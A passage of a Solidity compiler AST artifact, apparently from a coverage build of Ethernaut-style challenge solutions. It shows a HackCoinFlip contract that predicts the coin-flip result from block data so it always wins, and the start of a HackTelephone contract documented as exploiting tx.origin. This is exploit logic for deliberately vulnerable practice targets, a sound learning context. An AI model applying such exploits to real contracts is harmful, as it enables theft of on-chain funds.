                              "value": "0x4f4c27566bff8b25f7ea94e31751d90ac087cc47eb08deeb001241cfd48b9480"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_35867266913037679824268324462798464316439840705027564669913864152039809586304_by_1",
                                "typeString": "int_const 3586...(69 digits omitted)...6304"
                              }
                            ],
                            "id": 118,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "2058:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 120,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2058:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 121,
                        "nodeType": "ExpressionStatement",
                        "src": "2058:80:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307866626231643063353565303262623964383933623261336530366138633937353732626561303134326234623735323231393631356331616133333138656230",
                              "id": 123,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2173:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_113844697809115743029391615991107268308884306731731877814524142019666498391728_by_1",
                                "typeString": "int_const 1138...(70 digits omitted)...1728"
                              },
                              "value": "0xfbb1d0c55e02bb9d893b2a3e06a8c97572bea0142b4b752219615c1aa3318eb0"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_113844697809115743029391615991107268308884306731731877814524142019666498391728_by_1",
                                "typeString": "int_const 1138...(70 digits omitted)...1728"
                              }
                            ],
                            "id": 122,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "2160:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 124,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2160:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 125,
                        "nodeType": "ExpressionStatement",
                        "src": "2160:80:1"
                      },
                      {
                        "assignments": [
                          127
                        ],
                        "declarations": [
                          {
                            "constant": false,
                            "id": 127,
                            "mutability": "mutable",
                            "name": "coinFlip",
                            "nameLocation": "2267:8:1",
                            "nodeType": "VariableDeclaration",
                            "scope": 173,
                            "src": "2259:16:1",
                            "stateVariable": false,
                            "storageLocation": "default",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            "typeName": {
                              "id": 126,
                              "name": "uint256",
                              "nodeType": "ElementaryTypeName",
                              "src": "2259:7:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "visibility": "internal"
                          }
                        ],
                        "id": 131,
                        "initialValue": {
                          "commonType": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          "id": 130,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "leftExpression": {
                            "id": 128,
                            "name": "blockValue",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 62,
                            "src": "2278:10:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "/",
                          "rightExpression": {
                            "id": 129,
                            "name": "FACTOR",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 37,
                            "src": "2291:6:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            }
                          },
                          "src": "2278:19:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "VariableDeclarationStatement",
                        "src": "2259:38:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307830333565313737316339393038313066376134633230313864613133666362393832333965343263653636663432306464383936386637326139393537633663",
                              "id": 133,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2313:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_1523183977706133044696726285274577842994372005227436193069665515587224566892_by_1",
                                "typeString": "int_const 1523...(68 digits omitted)...6892"
                              },
                              "value": "0x035e1771c990810f7a4c2018da13fcb98239e42ce66f420dd8968f72a9957c6c"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_1523183977706133044696726285274577842994372005227436193069665515587224566892_by_1",
                                "typeString": "int_const 1523...(68 digits omitted)...6892"
                              }
                            ],
                            "id": 132,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "2300:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 134,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2300:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 135,
                        "nodeType": "ExpressionStatement",
                        "src": "2300:80:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307833666664336564666437613065386366326366643630633065653831396564303836353331336133376236306338386330393430316566363338663535383264",
                              "id": 137,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2415:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_28943155711184658493573607864146703827176664070597562474204495538056510920749_by_1",
                                "typeString": "int_const 2894...(69 digits omitted)...0749"
                              },
                              "value": "0x3ffd3edfd7a0e8cf2cfd60c0ee819ed0865313a37b60c88c09401ef638f5582d"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_28943155711184658493573607864146703827176664070597562474204495538056510920749_by_1",
                                "typeString": "int_const 2894...(69 digits omitted)...0749"
                              }
                            ],
                            "id": 136,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "2402:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 138,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2402:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 139,
                        "nodeType": "ExpressionStatement",
                        "src": "2402:80:1"
                      },
                      {
                        "assignments": [
                          141
                        ],
                        "declarations": [
                          {
                            "constant": false,
                            "id": 141,
                            "mutability": "mutable",
                            "name": "side",
                            "nameLocation": "2506:4:1",
                            "nodeType": "VariableDeclaration",
                            "scope": 173,
                            "src": "2501:9:1",
                            "stateVariable": false,
                            "storageLocation": "default",
                            "typeDescriptions": {
                              "typeIdentifier": "t_bool",
                              "typeString": "bool"
                            },
                            "typeName": {
                              "id": 140,
                              "name": "bool",
                              "nodeType": "ElementaryTypeName",
                              "src": "2501:4:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_bool",
                                "typeString": "bool"
                              }
                            },
                            "visibility": "internal"
                          }
                        ],
                        "id": 148,
                        "initialValue": {
                          "condition": {
                            "commonType": {
                              "typeIdentifier": "t_uint256",
                              "typeString": "uint256"
                            },
                            "id": 144,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "leftExpression": {
                              "id": 142,
                              "name": "coinFlip",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 127,
                              "src": "2513:8:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            },
                            "nodeType": "BinaryOperation",
                            "operator": "==",
                            "rightExpression": {
                              "hexValue": "31",
                              "id": 143,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2525:1:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_1_by_1",
                                "typeString": "int_const 1"
                              },
                              "value": "1"
                            },
                            "src": "2513:13:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_bool",
                              "typeString": "bool"
                            }
                          },
                          "falseExpression": {
                            "hexValue": "66616c7365",
                            "id": 146,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "bool",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "2536:5:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_bool",
                              "typeString": "bool"
                            },
                            "value": "false"
                          },
                          "id": 147,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "nodeType": "Conditional",
                          "src": "2513:28:1",
                          "trueExpression": {
                            "hexValue": "74727565",
                            "id": 145,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "bool",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "2529:4:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_bool",
                              "typeString": "bool"
                            },
                            "value": "true"
                          },
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "nodeType": "VariableDeclarationStatement",
                        "src": "2501:40:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307864333137663233666263303435643962336131303636636434376564383934313365383163353430666163323737356332393865623730353532633639363236",
                              "id": 150,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2559:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_95480320474452180891137364114082719134644334424873110627500323428413947156006_by_1",
                                "typeString": "int_const 9548...(69 digits omitted)...6006"
                              },
                              "value": "0xd317f23fbc045d9b3a1066cd47ed89413e81c540fac2775c298eb70552c69626"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_95480320474452180891137364114082719134644334424873110627500323428413947156006_by_1",
                                "typeString": "int_const 9548...(69 digits omitted)...6006"
                              }
                            ],
                            "id": 149,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "2546:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 151,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2546:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 152,
                        "nodeType": "ExpressionStatement",
                        "src": "2546:80:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307839636263666466636639343238633464333163323163333534393566316637333633313432346562313132343934323835353864663532396139376662656362",
                              "id": 154,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2661:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_70894724589150327881349316006414017690862757362911248147979547567646702550731_by_1",
                                "typeString": "int_const 7089...(69 digits omitted)...0731"
                              },
                              "value": "0x9cbcfdfcf9428c4d31c21c35495f1f73631424eb11249428558df529a97fbecb"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_70894724589150327881349316006414017690862757362911248147979547567646702550731_by_1",
                                "typeString": "int_const 7089...(69 digits omitted)...0731"
                              }
                            ],
                            "id": 153,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "2648:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 155,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2648:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 156,
                        "nodeType": "ExpressionStatement",
                        "src": "2648:80:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "id": 160,
                              "name": "side",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 141,
                              "src": "2769:4:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_bool",
                                "typeString": "bool"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_bool",
                                "typeString": "bool"
                              }
                            ],
                            "expression": {
                              "id": 157,
                              "name": "coinFlipContract",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 43,
                              "src": "2747:16:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_CoinFlip_$16",
                                "typeString": "contract CoinFlip"
                              }
                            },
                            "id": 159,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "flip",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 15,
                            "src": "2747:21:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
                              "typeString": "function (bool) external returns (bool)"
                            }
                          },
                          "id": 161,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2747:27:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "id": 162,
                        "nodeType": "ExpressionStatement",
                        "src": "2747:27:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307861383831306332613032653339323132356139343231333162393362363139353231383661646564396230313337363136343936383962353539363162326330",
                              "id": 164,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2792:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_76216565786923328027455392330497659794232678394706531633740330663565330592448_by_1",
                                "typeString": "int_const 7621...(69 digits omitted)...2448"
                              },
                              "value": "0xa8810c2a02e392125a942131b93b61952186aded9b013761649689b55961b2c0"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_76216565786923328027455392330497659794232678394706531633740330663565330592448_by_1",
                                "typeString": "int_const 7621...(69 digits omitted)...2448"
                              }
                            ],
                            "id": 163,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "2779:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 165,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2779:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 166,
                        "nodeType": "ExpressionStatement",
                        "src": "2779:80:1"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307864363433306537343839653134633163623335313338656265623833616639376365383261636438306336613164313133666335353439303663363164386666",
                              "id": 168,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "2894:66:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_96913428116482293216729402957380081196331584554546508988371094199202060818687_by_1",
                                "typeString": "int_const 9691...(69 digits omitted)...8687"
                              },
                              "value": "0xd6430e7489e14c1cb35138ebeb83af97ce82acd80c6a1d113fc554906c61d8ff"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_96913428116482293216729402957380081196331584554546508988371094199202060818687_by_1",
                                "typeString": "int_const 9691...(69 digits omitted)...8687"
                              }
                            ],
                            "id": 167,
                            "name": "c_0xcd8256e5",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 32,
                            "src": "2881:12:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 169,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "2881:80:1",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 170,
                        "nodeType": "ExpressionStatement",
                        "src": "2881:80:1"
                      },
                      {
                        "expression": {
                          "id": 171,
                          "name": "side",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 141,
                          "src": "2987:4:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "functionReturnParameters": 48,
                        "id": 172,
                        "nodeType": "Return",
                        "src": "2980:11:1"
                      }
                    ]
                  },
                  "documentation": {
                    "id": 44,
                    "nodeType": "StructuredDocumentation",
                    "src": "669:95:1",
                    "text": "@dev Calls CoinFlip.flip method with (true/false) for winning always based on on-chain data"
                  },
                  "functionSelector": "cde4efa9",
                  "id": 174,
                  "implemented": true,
                  "kind": "function",
                  "modifiers": [],
                  "name": "flip",
                  "nameLocation": "779:4:1",
                  "nodeType": "FunctionDefinition",
                  "parameters": {
                    "id": 45,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "783:2:1"
                  },
                  "returnParameters": {
                    "id": 48,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 47,
                        "mutability": "mutable",
                        "name": "",
                        "nameLocation": "-1:-1:-1",
                        "nodeType": "VariableDeclaration",
                        "scope": 174,
                        "src": "802:4:1",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        "typeName": {
                          "id": 46,
                          "name": "bool",
                          "nodeType": "ElementaryTypeName",
                          "src": "802:4:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bool",
                            "typeString": "bool"
                          }
                        },
                        "visibility": "internal"
                      }
                    ],
                    "src": "801:6:1"
                  },
                  "scope": 175,
                  "src": "770:2229:1",
                  "stateMutability": "nonpayable",
                  "virtual": false,
                  "visibility": "public"
                }
              ],
              "scope": 176,
              "src": "329:2673:1",
              "usedErrors": []
            }
          ],
          "src": "33:2971:1"
        },
        "id": 1
      },
      "contracts/4_Telephone/HackTelephone.sol": {
        "ast": {
          "absolutePath": "contracts/4_Telephone/HackTelephone.sol",
          "exportedSymbols": {
            "HackTelephone": [
              244
            ],
            "Telephone": [
              328
            ],
            "c_0x4799e30e": [
              183
            ],
            "c_0x8154b289": [
              252
            ]
          },
          "id": 245,
          "license": "MIT",
          "nodeType": "SourceUnit",
          "nodes": [
            {
              "id": 177,
              "literals": [
                "solidity",
                "0.8",
                ".10"
              ],
              "nodeType": "PragmaDirective",
              "src": "33:23:2"
            },
            {
              "body": {
                "id": 182,
                "nodeType": "Block",
                "src": "107:2:2",
                "statements": []
              },
              "id": 183,
              "implemented": true,
              "kind": "freeFunction",
              "modifiers": [],
              "name": "c_0x4799e30e",
              "nameLocation": "66:12:2",
              "nodeType": "FunctionDefinition",
              "parameters": {
                "id": 180,
                "nodeType": "ParameterList",
                "parameters": [
                  {
                    "constant": false,
                    "id": 179,
                    "mutability": "mutable",
                    "name": "c__0x4799e30e",
                    "nameLocation": "87:13:2",
                    "nodeType": "VariableDeclaration",
                    "scope": 183,
                    "src": "79:21:2",
                    "stateVariable": false,
                    "storageLocation": "default",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bytes32",
                      "typeString": "bytes32"
                    },
                    "typeName": {
                      "id": 178,
                      "name": "bytes32",
                      "nodeType": "ElementaryTypeName",
                      "src": "79:7:2",
                      "typeDescriptions": {
                        "typeIdentifier": "t_bytes32",
                        "typeString": "bytes32"
                      }
                    },
                    "visibility": "internal"
                  }
                ],
                "src": "78:23:2"
              },
              "returnParameters": {
                "id": 181,
                "nodeType": "ParameterList",
                "parameters": [],
                "src": "107:0:2"
              },
              "scope": 245,
              "src": "57:52:2",
              "stateMutability": "pure",
              "virtual": false,
              "visibility": "internal"
            },
            {
              "absolutePath": "contracts/4_Telephone/Telephone.sol",
              "file": "./Telephone.sol",
              "id": 184,
              "nameLocation": "-1:-1:-1",
              "nodeType": "ImportDirective",
              "scope": 245,
              "sourceUnit": 329,
              "src": "114:25:2",
              "symbolAliases": [],
              "unitAlias": ""
            },
            {
              "abstract": false,
              "baseContracts": [],
              "canonicalName": "HackTelephone",
              "contractDependencies": [],
              "contractKind": "contract",
              "documentation": {
                "id": 185,
                "nodeType": "StructuredDocumentation",
                "src": "143:438:2",
                "text": "@title Contract for hacking Telephone.sol\n @author Pedro Reyes\n @custom:link https://docs.soliditylang.org/en/v0.8.15/units-and-global-variables.html?highlight=tx.origin#block-and-transaction-properties\n @custom:link https://docs.soliditylang.org/en/v0.8.15/security-considerations.html?highlight=tx.origin#tx-origin\n @custom:link https://ethereum.stackexchange.com/questions/196/how-do-i-make-my-dapp-serenity-proof"
              },
              "fullyImplemented": true,
              "id": 244,
              "linearizedBaseContracts": [
                244
              ],
              "name": "HackTelephone",
              "nameLocation": "590:13:2",
              "nodeType": "ContractDefinition",
              "nodes": [
                {
                  "body": {
                    "id": 190,
                    "nodeType": "Block",
                    "src": "665:2:2",
                    "statements": []
                  },
                  "id": 191,
                  "implemented": true,
                  "kind": "function",
                  "modifiers": [],
                  "name": "c_0x57d152bd",
                  "nameLocation": "615:12:2",
                  "nodeType": "FunctionDefinition",
                  "parameters": {
                    "id": 188,
                    "nodeType": "ParameterList",
                    "parameters": [
                      {
                        "constant": false,
                        "id": 187,
                        "mutability": "mutable",
                        "name": "c__0x57d152bd",
                        "nameLocation": "636:13:2",
                        "nodeType": "VariableDeclaration",
                        "scope": 191,
                        "src": "628:21:2",
                        "stateVariable": false,
                        "storageLocation": "default",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bytes32",
                          "typeString": "bytes32"
                        },
                        "typeName": {
                          "id": 186,
                          "name": "bytes32",
                          "nodeType": "ElementaryTypeName",
                          "src": "628:7:2",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bytes32",
                            "typeString": "bytes32"
                          }
                        },
                        "visibility": "internal"
                      }
                    ],
                    "src": "627:23:2"
                  },
                  "returnParameters": {
                    "id": 189,
                    "nodeType": "ParameterList",
                    "parameters": [],
                    "src": "665:0:2"
                  },
                  "scope": 244,
                  "src": "606:61:2",
                  "stateMutability": "pure",
                  "virtual": false,
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 194,
                  "mutability": "mutable",
                  "name": "telephone",
                  "nameLocation": "684:9:2",
                  "nodeType": "VariableDeclaration",
                  "scope": 244,
                  "src": "674:19:2",
                  "stateVariable": true,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_contract$_Telephone_$328",
                    "typeString": "contract Telephone"
                  },
                  "typeName": {
                    "id": 193,
                    "nodeType": "UserDefinedTypeName",
                    "pathNode": {
                      "id": 192,
                      "name": "Telephone",
                      "nodeType": "IdentifierPath",
                      "referencedDeclaration": 328,
                      "src": "674:9:2"
                    },
                    "referencedDeclaration": 328,
                    "src": "674:9:2",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Telephone_$328",
                      "typeString": "contract Telephone"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "body": {
                    "id": 217,
                    "nodeType": "Block",
                    "src": "732:341:2",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307866323237373763623034653136346662613433643334376136346439323732666366666433313166653034663165663366313166643464343731316339636233",
                              "id": 200,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "746:66:2",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_109529443173875235555276417062523631613315284187850352830033112538071550434483_by_1",
                                "typeString": "int_const 1095...(70 digits omitted)...4483"
                              },
                              "value": "0xf22777cb04e164fba43d347a64d9272fcffd311fe04f1ef3f11fd4d4711c9cb3"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_109529443173875235555276417062523631613315284187850352830033112538071550434483_by_1",
                                "typeString": "int_const 1095...(70 digits omitted)...4483"
                              }
                            ],
                            "id": 199,
                            "name": "c_0x57d152bd",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 191,
                            "src": "733:12:2",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 201,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "733:80:2",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 202,
                        "nodeType": "ExpressionStatement",
                        "src": "733:80:2"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307833666161656365343436346438333864633632396137373262633266653030353934623838356335646263636162373431653937353564386265623863326238",
                              "id": 204,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "846:66:2",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_28797708428167538265289804899075000466894104749791971424590399990529665843896_by_1",
                                "typeString": "int_const 2879...(69 digits omitted)...3896"
                              },
                              "value": "0x3faaece4464d838dc629a772bc2fe00594b885c5dbccab741e9755d8beb8c2b8"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_rational_28797708428167538265289804899075000466894104749791971424590399990529665843896_by_1",
                                "typeString": "int_const 2879...(69 digits omitted)...3896"
                              }
                            ],
                            "id": 203,
                            "name": "c_0x57d152bd",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 191,
                            "src": "833:12:2",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_internal_pure$_t_bytes32_$returns$__$",
                              "typeString": "function (bytes32) pure"
                            }
                          },
                          "id": 205,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "833:80:2",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 206,
                        "nodeType": "ExpressionStatement",
                        "src": "833:80:2"
                      },
                      {
                        "expression": {
                          "arguments": [
                            {
                              "hexValue": "307831393035613765613162393134616438303233646635303965373464626533646631646339333735613266616331346263646362353565646135306565666233",
                              "id": 208,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "948:66:2",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_11317814353076187452961395993658241566574074362769755405406491327971044814771_by_1",
                                "typeString": "int_const 1131...(69 digits omitted)...4771"
                              },
                              "value": "0x1905a7ea1b914ad8023df509e74dbe3df1dc9375a2fac14bcdcb55eda50eefb3"
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
